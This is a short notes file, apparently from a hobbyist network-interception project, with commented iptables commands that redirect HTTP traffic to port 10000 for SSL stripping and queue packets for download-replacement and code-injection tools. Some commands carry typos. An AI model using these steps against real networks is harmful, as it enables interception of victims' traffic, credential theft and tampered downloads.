"""To use SSL Strip"""
#command to route traffic through port 10000 for ssl strip
#iptables - t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

"""This is for using replace downloads and injector, MUST CHANGE PORTS ON PROGRAMS to 10000"""
#iptalbes-I OUTPUT -j NFQUEUE --queue-num 0
#iptalbes-I INPUT -j NFQUEUE --queue-num 0
